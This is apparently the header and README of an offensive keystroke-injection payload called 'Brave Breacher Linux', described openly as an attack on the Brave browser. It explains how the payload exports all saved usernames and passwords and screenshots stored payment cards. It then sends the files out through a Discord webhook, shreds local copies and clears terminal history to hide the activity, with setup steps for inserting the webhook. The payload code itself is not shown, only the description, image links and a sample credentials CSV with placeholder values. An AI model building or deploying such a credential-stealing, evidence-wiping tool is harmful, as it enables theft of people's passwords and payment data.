REM TITLE: Brave Breacher Linux

REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)

REM TARGET OS: Linux (tested on Pop!_OS) | Tested on Flatpak version Brave Browser

REM DESCRIPTION: Brave Breacher is a side channel attack payload that utilizes loops of TAB, arrow directional keys, etc. as well as utilizing Brave settings URL parameters to navigate the Brave Browser. The payload has two phases: Phase 1, all username and password credentials stored in the browser are exported to be exfiltrated. Phase 2, the payload then navigates to the payment method settings menu and screenshots the stored payment method on file. The files are then moved to the /Pictures/Screenshots directory, tarballed, and then exfiltrated via Discord webhook. All files in the /Pictures/Screenshots directory are then shredded and the terminal history is cleared. Additionally, once each phase is completed, the respective windows (the browser/terminal) are closed to obfuscate activity. To work, add Discord webhook to line 103, add user to lines 95/105.

![BraveBreacher](https://github.com/user-attachments/assets/42e72651-5546-4c43-9028-8d6c636c3598)

![loot](https://github.com/user-attachments/assets/1e56751c-4fd3-4ef1-b8ab-b9bbb25412a0)

![loott](https://github.com/user-attachments/assets/dea742b6-bfac-4cd6-a57e-009b47c60f4f)

```
name,url,username,password,note
site1.com,https://site1.com/,user1,pass1,
site2.com,https://site2.com/,user2,pass2,
site3.com,https://site3.com/,user3,pass3,
site4.com,https://site4.com/,site4,pass4,
```
